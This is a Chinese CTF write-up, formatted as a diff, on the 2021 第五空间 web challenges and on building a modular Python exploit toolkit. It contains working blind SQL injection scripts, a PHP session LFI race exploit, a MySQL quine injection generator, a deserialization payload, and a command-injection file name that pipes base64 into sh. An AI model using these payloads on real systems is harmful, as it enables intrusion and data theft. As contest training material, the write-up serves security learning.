@@ -1,0 +1,465 @@
+# 第五空间线上赛web部分题解与模块化CTF解题工具编写的一些思考
+
+阅读量 **199956**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2021-10-18 17:30:38
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p2.ssl.qhimg.com/t01cc71c4ea54253eea.png)
+
+## 0x00 前言
+
+之前在打大大小小的比赛过程中，发现其实很多题的手法和流程是一致的，只是具体的细节比如说绕过方式不同，如何在比赛中快速写好通用的逻辑，在解具体赛题的过程中又能快速实现自定义化细节呢。一个简单的思路就是利用OOP的思想，编写一些基础通用的模块，在比赛时通过继承和方法重写实现快速自定义化。
+
+比如在一类盲注题目中，无论是时间还是布尔，一般来说我们需要拿到一个判断输入逻辑是否正确的函数，比如下面这个hack函数
+
+    
+    
+        def hack(host:str,payload:str)->bool:
+            data = {
+                "uname":f"-1' or {payload}#",
+                "passwd":f"123"
+            }
+            res = requests.post(f"{host}/sqli.php",data=data)
+            #print(res.content)
+            if b"admin" in res.content:
+                return True
+            return False
+    
+
+通过这个函数我们判断一个sql语句的逻辑结果是否正确，利用这点，我们可以利用枚举或者二分的手法来判断数据内容，从而进行盲注,一个常见的枚举函数如下图所示
+
+    
+    
+        def equBlind(sql:str)->None:
+            ret=""
+            i = 1
+            while True:
+                flag = 0
+                for ch in string.printable:
+                    payload=f'((ascii(substr(({sql}),{i},1)))={ord(ch)})'
+                    sys.stdout.write("{0} [-] Result : -> {1} <-\r".format(threading.current_thread().name,ret+ch))
+                    sys.stdout.flush()
+                    if hack(payload):
+                        ret=ret+ch
+                        sys.stdout.write("{0} [-] Result : -> {1} <-\r".format(threading.current_thread().name,ret))
+                        sys.stdout.flush()
+                        flag = 1
+                        break
+                if flag == 0:
+                    break
+                i+=1
+            sys.stdout.write(f"{threading.current_thread().name} [+] Result : -> {ret} <-")
+    
+
+当然，不同的题目注入的方式和注入点肯定是不一样的，需要快速的自定义细节，那么我们要继续细化各函数的功能吗，显然不太现实，而且调用起来也会很麻烦。如何在耦合和内聚中取得平衡是在模块编写中需要注意的。目前的一个简单想法就是把大的逻辑分开，比如盲注中判定sql逻辑的部分和注出数据的部分，从外部传入target，各功能之间的公用参数挂在对象上。下面是一个基础的Sql注入利用类
+
+    
+    
+    import requests
+    import threading,sys
+    import string
+    
+    class BaseSqliHelper:
+        def __init__(self,host:str) -> None:
+            self.host = host
+            self.pt = string.printable
+            pass
+    
+        def hack(self,payload:str)->bool:
+            data = {
+                "uname":f"-1' or {payload}#",
+                "passwd":f"123"
+            }
+            res = requests.post(f"{self.host}/sqli.php",data=data)
+            #print(res.content)
+            if b"admin" in res.content:
+                return True
+            return False
+    
+        def equBlind(self,sql:str)->None:
+            ret=""
+            i = 1
+            while True:
+                flag = 0
+                for ch in self.pt:
+    
+                    payload=f'((ascii(substr(({sql}),{i},1)))={ord(ch)})'
+    
+                    sys.stdout.write("{0} [-] Result : -> {1} <-\r".format(threading.current_thread().name,ret+ch))
+                    sys.stdout.flush()
+                    if self.hack(payload):
+                        ret=ret+ch
+                        sys.stdout.write("{0} [-] Result : -> {1} <-\r".format(threading.current_thread().name,ret))
+                        sys.stdout.flush()
+                        flag = 1
+                        break
+                if flag == 0:
+                    break
+                i+=1
+            sys.stdout.write(f"{threading.current_thread().name} [+] Result : -> {ret} <-")
+    
+        def efBlind(self,sql:str)->None:
+            ret=""
+            i = 1
+            while True:
+                l=20
+                r=130
+                while(l+1<r):
+                    mid=(l+r)//2
+                    payload=f"if((ascii(substr(({sql}),{i},1)))>{mid},1,0)"
+                    if self.hack(payload):
+                        l=mid
+                    else :
+                        r=mid
+                if(chr(r) not in self.pt):
+                    break
+                i+=1
+                ret=ret+chr(r)
+                sys.stdout.write("[-]{0} Result : -> {1} <-\r".format(threading.current_thread().name,ret))
+                sys.stdout.flush()
+            sys.stdout.write(f"{threading.current_thread().name} [+] Result : -> {ret} <-")
+    
+    if __name__ == "__main__":
+        host = "http://127.0.0.1:2335"
+        sqlexp = BaseSqliHelper(host=host)
+        print(sqlexp.hack("1=1"))
+        sql = "select database()"
+        sqlexp.equBlind(sql)
+        sqlexp.efBlind(sql)
+    
+
+目前在 <https://github.com/EkiXu/ekitools> 仓库中实现了几个简单的模块，包括php session lfi,Sqli
+以及quine相关,tests文件夹下存放了一些示例用来测试基础类功能是否正常。
+
+一些模块利用方法将会在后面的wp中具体进行介绍。
+
+## 0x01 EasyCleanup
+
+看了一下源码，出题人应该是想让选手利用最多8种字符，最长15字符的rce实现getshell，然而看phpinfo();没禁php session
+upload progress同时给了文件包含
+
+那么就直接拿写好的模块一把梭了,可以看到这里利用继承重写方法的方式进行快速自定义，实际解题中就是copy基础类源码中示例函数+简单修改
+
+    
+    
+    from ekitools.PHP_LFI import BasePHPSessionHelper
+    import threading,requests
+    
+    host= "http://114.115.134.72:32770"
+    
+    class Exp(BasePHPSessionHelper):
+    
+        def sessionInclude(self,sess_name="ekitest"):
+            #sessionPath = "/var/lib/php5/sess_" + sess_name
+            #sessionPath = f"/var/lib/php/sessions/sess_{sess_name}"
+            sessionPath = f"/tmp/sess_{sess_name}"
+            upload_url = f"{self.host}/index.php"
+            include_url = f"{self.host}/index.php?file={sessionPath}"
+            headers = {'Cookie':'PHPSESSID=' + sess_name}
+            t = threading.Thread(target=self.createSession,args=(upload_url,sess_name))
+            t.setDaemon(True)
+            t.start()
+            while True:
+                res = requests.post(include_url,headers=headers)
+                if b'Included' in res.content:
+                    print("[*] Get shell success.")
+                    print(include_url,res.content)
+                    break
+                else:
+                    print("[-] retry.")
+            return True
+    
+    exp = Exp(host)
+    
+    exp.sessionInclude("g")
+    
+
+## 0x02 yet_another_mysql_injection
+
+题目提示了`?source`给了源码
+
+    
+    
+    <?php
+    include_once("lib.php");
+    function alertMes($mes,$url){
+        die("<script>alert('{$mes}');location.href='{$url}';</script>");
+    }
+    
+    function checkSql($s) {
+        if(preg_match("/regexp|between|in|flag|=|>|<|and|\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\$|0x|sleep|\ /i",$s)){
+            alertMes('hacker', 'index.php');
+        }
+    }
+    
+    if (isset($_POST['username']) && $_POST['username'] != '' && isset($_POST['password']) && $_POST['password'] != '') {
+        $username=$_POST['username'];
+        $password=$_POST['password'];
+        if ($username !== 'admin') {
+            alertMes('only admin can login', 'index.php');
+        }
+        checkSql($password);
+        $sql="SELECT password FROM users WHERE username='admin' and password='$password';";
+        $user_result=mysqli_query($con,$sql);
+        $row = mysqli_fetch_array($user_result);
+        if (!$row) {
+            alertMes("something wrong",'index.php');
+        }
+        if ($row['password'] === $password) {
+        die($FLAG);
+        } else {
+        alertMes("wrong password",'index.php');
+      }
+    }
+    
+    if(isset($_GET['source'])){
+      show_source(__FILE__);
+      die;
+    }
+    ?>
+    
+    
+    <!-- source code here:  /?source -->
+    
+    
+    <!DOCTYPE html>
+    <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="initial-scale=1.0, user-scalable=no, width=device-width">
+    <title>SQLi</title>
+    <link rel="stylesheet" type="text/css" href="./files/reset.css">
+    <link rel="stylesheet" type="text/css" href="./files/scanboardLogin.css">
+    <link rel="stylesheet" type="text/css" href="./files/animsition.css">
+    </head>
+    <body>
+      <div class="wp animsition" style="animation-duration: 0.8s; opacity: 1;">
+        <div class="boardLogin">
+          <div class="logo ">
+            LOGIN AS ADMIN!
+          </div>
+          <form action="index.php" method="post">
+            <div class="inpGroup">
+              <span class="loginIco1"></span>
+              <input type="text" name="username" placeholder="请输入您的用户名">
+            </div>
+    
+            <div class="inpGroup">
+              <span class="loginIco2"></span>
+              <input type="password" name="password" placeholder="请输入您的密码">
+            </div>
+            <div class="prompt">
+              <p class="success">输入正确</p>
+            </div>
+    
+            <button class="submit">登录</button>
+          </form>
+        </div>
+      </div>
+      <div id="particles-js"><canvas class="particles-js-canvas-el" style="width: 100%; height: 100%;" width="3360" height="1780"></canvas></div>
+    
+    <script type="text/javascript" src="./files/jquery.min.js"></script>
+    <script type="text/javascript" src="./files/jquery.animsition.js"></script>
+    <script src="./files/particles.min.js"></script>
+    <script src="./files/app.js"></script>
+    <script type="text/javascript">
+      $(".animsition").animsition({
+          inClass               :   'fade-in',
+          outClass              :   'fade-out',
+          inDuration            :    800,
+          outDuration           :    1000,
+          linkElement           :   '.animsition-link',
+    
+          loading               :    false,
+          loadingParentElement  :   'body',
+          loadingClass          :   'animsition-loading',
+          unSupportCss          : [ 'animation-duration',
+                                    '-webkit-animation-duration',
+                                    '-o-animation-duration'
+                                  ],
+    
+    
+          overlay               :   false,
+    
+          overlayClass          :   'animsition-overlay-slide',
+          overlayParentElement  :   'body'
+        });
+    </script>
+    
+    </body></html>
+    
+
+可以看到可控参数其实只有password,那么直接构造一个永真式
+
+    
+    
+    'or '1'like '1
+    
+
+然后发现还是报
+
+    
+    
+    alertMes("something wrong",'index.php');
+    
+
+可以推断库中没有数据，此时仍然要使得`$row['password'] ===
+$password`,很容易想到通过联合注入来构造`$row['password']`,然而为了实现这一目标我们要使输入的password参数查出的`password`列值为自身。事实上这是一类quine即执行自身输出自身，quine一个常见的思路就是通过替换来构造,通过将一个较短的占位符，替换成存在的长串字符串来构造。这个考点也在Holyshield
+CTF和Codegate出现过
+
+    
+    
+    def genMysqlQuine(sql:str,debug:bool=False,tagChar:str="$")->str:
+        '''
+        $$用于占位
+        '''
+        tagCharOrd:int = ord(tagChar)
+        if debug: 
+            print(sql)
+        sql = sql.replace('$$',f"REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR({tagCharOrd}),$$)")
+        text = sql.replace('$$',f'"{tagChar}"').replace("'",'"')
+        sql = sql.replace('$$',f"'{test}'")
+        if debug: 
+            print(sql)
+        return sql
+    
+    
+    if __name__ == "__main__":
+        res = genMysqlQuine("UNION SELECT $$ as password -- ",tagChar="%")
+        print(res)
+    
+
+该代码也模块化放在ekitools里了
+
+    
+    
+    from ekitools.quine import genMysqlQuine
+    import requests
+    
+    host = "http://114.115.143.25:32770"
+    
+    data = {
+        "username":"admin",
+        "password":genMysqlQuine("'union select $$ as password#",tagChar="%").replace(" ","/**/")
+    }
+    
+    print(data)
+    
+    res = requests.post(host,data=data)
+    
+    print(res.content)
+    
+
+## 0x03 pklovecloud
+
+直接反序列化了,好像也没啥链子。。。
+
+    
+    
+    <?php  
+    class acp 
+    {   
+        protected $cinder;  
+        public $neutron;
+        public $nova;
+    
+        function setCinder($cinder){
+            $this->cinder = $cinder;
+        }
+    }  
+    
+    class ace
+    {    
+        public $filename;     
+        public $openstack;
+        public $docker; 
+    }  
+    
+    
+    $b = new stdClass;
+    
+    $b->neutron = $heat;
+    $b->nova = $heat;
+    
+    $a = new ace;
+    
+    $a->docker = $b;
+    $a->filename = 'flag.php';
+    $exp = new acp;
+    
+    
+    $exp->setCinder($a);
+    
+    var_dump(urlencode(serialize($exp)));
+    
+    ?>
+    
+
+## 0x04 PNG图片转换器
+
+阅读相关材料
+
+<https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#command-injection>
+
+可知redis的一个特性 open能够命令注入
+
+![](https://p2.ssl.qhimg.com/t0199da55aba15b9b46.png)
+
+那么绕过手段就很多了，比如base64
+
+    
+    
+    import requests
+    
+    url  = "http://114.115.128.215:32770"
+    #url = "http://127.0.0.1:4567"
+    
+    print(hex(ord('.')),hex(ord("/")))
+    
+    res = requests.post(f"{url}/convert",data="file=|echo Y2F0IC9GTEE5X0t5d1hBdjc4TGJvcGJwQkR1V3Nt | base64 -d | sh;.png".encode("utf-8"),headers={"Content-Type":"application/x-www-form-urlencoded"},allow_redirects=False)
+    
+    print(res.content)
+    
+
+## 0x05 WebFtp
+
+好像就是一个`./git`源码泄露，审计下代码在`/Readme/mytz.php`有act能获取phpinfo(),在phpinfo环境变量页面里能得到flag
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **Eki** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/253526](/post/id/253526)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [CTF](/tag/CTF)
+
+ **+1** __2赞
+
+ __收藏
+
+![](https://p0.ssl.qhimg.com/t012521b8c9e29a374e.png) Eki
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
